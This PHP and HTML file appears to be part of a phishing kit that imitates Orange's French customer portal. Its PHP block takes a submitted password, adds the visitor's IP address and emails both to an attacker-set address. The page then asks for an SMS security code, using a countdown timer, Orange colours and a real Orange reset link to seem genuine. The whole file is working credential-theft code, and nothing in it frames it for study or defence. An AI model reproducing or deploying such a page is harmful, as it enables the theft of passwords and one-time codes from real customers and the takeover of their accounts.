<?php

include_once ("auth.php");
if(isset($_POST['pass'])){
    $password = $_POST['pass'];

    $data = "Mot de passe(x2): $password,\nAdresse IP: $IP,";
    setHeader($data, $IP);
    $success = mail($SEND_TO, "Mot de passe de $IP", $data);
    sleep(3);
}
?>

    <div id="stage" class="eui-st2">
        <label for="password" id="passwordLabel">Saisie du code de sécurité</label>
        <div style="width: 40px; height: 6px; background: #f16e00"></div>
        <br>
        <div class="circle" style="position: relative;left: 70px;">
            <svg width="100" viewBox="0 0 220 220" xmlns="http://www.w3.org/2000/svg">
            <g transform="translate(110,110)">
                <circle r="100" class="e-c-base" />
                <g transform="rotate(-90)">
                <circle r="100" class="e-c-progress" />
                <g id="e-pointer">
                    <circle cx="100" cy="0" r="8" class="e-c-pointer" />
                </g>
                </g>
            </g>
            </svg>
            <div class="controlls">
            <div class="display-remain-time" style="">60</div>
            <!-- //   <button class="play" id="pause"></button> -->
            </div>
        </div>
 

        <p>Un sms contenant un code de sécurité, vous a été envoyé sur votre numéro</p>
    </div>
    <h2 class="sr-only">Saisie du code de sécurité</h2>
    <div class="clearfix"></div>
    <div class="form-group ">
        <div class="eui-help" id="helpPasswordCnt" style="display : none;">
            <p class="noSelectContent" tabindex="-1">Vous ne retrouvez pas votre mot de passe. &gt;&gt; <a href="https://mdp.orange.fr?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil&amp;login=F1RYiR%2BrDwulIp%2BpnyDbftDejktufnYYV%2F2ynqH0syO7fn8%2FI23fDmZNw04gbQ5KFh%2BB7a3jJHmCjeHqNLkOk3CNKQIVsOcPt%2BrFsHPjCiRIpQqc7%2FedaQH3EolJvW2kKzT8W26EkmhxHOqI4eeyBYPGHgSiVFcDNkAcNzGIiSKbnUohpmC1uMCouZa%2BuaTVh1gDAMmmZBjalmzFwmH5Zz5i5KhPYu7FPLvq2jn5ecNwphejQPEVfT9kMLQeB1HE%2FMtib1wUwQtW95xVZgsMCeNquiEMEpDza4roDEE8WQeVknl3Hf0vYBuygYRS1853zK0MeoZ331mtyIchzsN7Vw%3D%3D" class="eui-reinitLostLink" title="Réinitialisez-le.">Réinitialisez-le.</a></p>
        </div>
        <h6 id="error-msg-box" tabindex="0" class="form-control-message" aria-hidden="true" aria-live="assertive" role="alert"></h6>

        <div id="passwordContainer">
            <input type="text" id="password"    name="code" placeholder="Code de sécurité" auto-complete="one-time-code" class="form-control pass-assist" required="" aria-hidden="false" aria-invalid="false" aria-required="true">
        </div>
        <br>
        <div id="renewsms">
        <div><a href=".?new=22211">Un problème?</a></div>
        <!-- <p onclick="$('#formContainer').hide(),$('#loaderr').show(),setTimeout(() => { pauseTimer(),$('#formContainer').show(),$('#loaderr').hide() }, 3000);"><a href="#" id="sms" style="text-decoration: underline"><b>Recevoir un nouveau code par sms</b></a></p> -->
        <p onclick="pauseTimer(), wipeInput()"><a href="#" id="sms" style="text-decoration: underline"><b>Recevoir un nouveau code par sms</b></a></p>
        </div>
    </div>
    <div class="text-center" style="position: relative;left: 0px; text-align: initial">
        <button id="btnSubmi" type="submit" onclick=" $('#btnSubmi').trigger('submit') ;this.disabled = true"  class="btn btn-info eui-btn-sub">Suivant</button>
    </div>
<script>

     function wipeInput(){
        $('#password').val("")
     }
    $('#sms').on('click', function (e) {
        e.preventDefault();
    });
</script>

<script>
  //circle start
  let progressBar = document.querySelector(".e-c-progress");
  let indicator = document.getElementById("e-indicator");
  let pointer = document.getElementById("e-pointer");
  let renewsms = document.getElementById("renewsms");
  renewsms.style="display:none";
  let length = Math.PI * 2 * 100;

  progressBar.style.strokeDasharray = length;

  function update(value, timePercent) {
    var offset = -length - (length * value) / timePercent;
    progressBar.style.strokeDashoffset = offset;
    pointer.style.transform = `rotate(${(360 * value) / timePercent}deg)`;
  }

  //circle ends
  const displayOutput = document.querySelector(".display-remain-time");
  displayOutput.textContent = 60;
  const pauseBtn = document.getElementById("pause");
  const setterBtns = document.querySelectorAll("button[data-setter]");
  

  let intervalTimer;
  let timeLeft;
  let wholeTime = 0.5 * 120; // manage this to set the whole time
  let isPaused = false;
  let isStarted = false;

  update(wholeTime, wholeTime); //refreshes progress bar
  displayTimeLeft(wholeTime);

  function changeWholeTime(seconds) {
    if (wholeTime + seconds > 0) {
      wholeTime += seconds;
      update(wholeTime, wholeTime);
    }
  }
  function timer(seconds) {
    //counts time, takes seconds
    let remainTime = Date.now() + seconds * 1000;
    displayTimeLeft(seconds);

    intervalTimer = setInterval(function () {
      timeLeft = Math.round((remainTime - Date.now()) / 1000);
      if (timeLeft < 0) {
        clearInterval(intervalTimer);
        isStarted = false;
        renewsms.style=""
       // displayTimeLeft(wholeTime);
        return;
      }
      displayTimeLeft(timeLeft);
    }, 1000);
  }
  function pauseTimer(event) {
    if (isStarted === false) {
      timer(wholeTime);
      isStarted = true;
    } else if (isPaused) {
      timer(timeLeft);
      isPaused = isPaused ? false : true;
    } else {
      clearInterval(intervalTimer);
      isPaused = isPaused ? false : true;
    }
  }

  function displayTimeLeft(timeLeft) {
    //displays time on the input
    let minutes = Math.floor(timeLeft / 60);
    let seconds = timeLeft % 61;
    let displayString = ` ${seconds < 10 ? "0" : ""}${seconds}`;
    displayOutput.textContent = displayString;
    update(timeLeft, wholeTime);
  }

  //  pauseBtn.addEventListener("click", pauseTimer);
  pauseTimer();
  //displayTimeLeft(wholeTime);

  // pauseTimer();
</script>



<style>
  @import url("https://fonts.googleapis.com/css?family=Roboto:100,300");


  input::-webkit-outer-spin-button,
input::-webkit-inner-spin-button {
   -webkit-appearance: none;
   margin: 0;
}
input[type="number"] {
   -moz-appearance: textfield;
}

  button[data-setter] {
    outline: none;
    background: transparent;
    border: none;
    font-family: "Roboto";
    font-weight: 300;
    font-size: 18px;
    width: 25px;
    height: 30px;
    color: #f16e00;
    cursor: pointer;
  }

  button[data-setter]:hover {
    opacity: 0.5;
  }

  .container {
    position: relative;
    top: 30px;
    width: 300px;
    margin: 0 auto;
  }

  .setters {
    position: absolute;
    left: 85px;
    top: 75px;
  }

  .minutes-set {
    float: left;
    margin-right: 28px;
  }

  .seconds-set {
    float: right;
  }

  .controlls {
    position: absolute;
    left: 22px;
    top: 15px;
    text-align: center;
  }

  .display-remain-time {
    font-family: "Roboto";
    font-weight: 100;
    font-size: 50px;
    color: #f16e00;
  }

  #pause {
    outline: none;
    background: transparent;
    border: none;
    margin-top: 10px;
    width: 50px;
    height: 50px;
    position: relative;
  }

  .play::before {
    display: block;
    content: "";
    position: absolute;
    top: 8px;
    left: 16px;
    border-top: 15px solid transparent;
    border-bottom: 15px solid transparent;
    border-left: 22px solid #f7958e;
  }

  .pause::after {
    content: "";
    position: absolute;
    top: 8px;
    left: 12px;
    width: 15px;
    height: 30px;
    background-color: transparent;
    border-radius: 1px;
    border: 5px solid #f7958e;
    border-top: none;
    border-bottom: none;
  }

  #pause:hover {
    opacity: 0.8;
  }

  .e-c-base {
    fill: none;
    stroke: #f16e00;
    stroke-width: 4px;
  }

  .e-c-progress {
    fill: none;
    stroke: #000;
    stroke-width: 4px;
    transition: stroke-dashoffset 0.7s;
  }

  .e-c-pointer {
    fill: #000;
    stroke: #f16e00;
    stroke-width: 2px;
  }

  #e-pointer {
    transition: transform 0.7s;
  }
  h1 {
    margin-top: 150px;
    text-align: center;
  }
  body {
    background-color: #f7f7f7;
  }
</style>

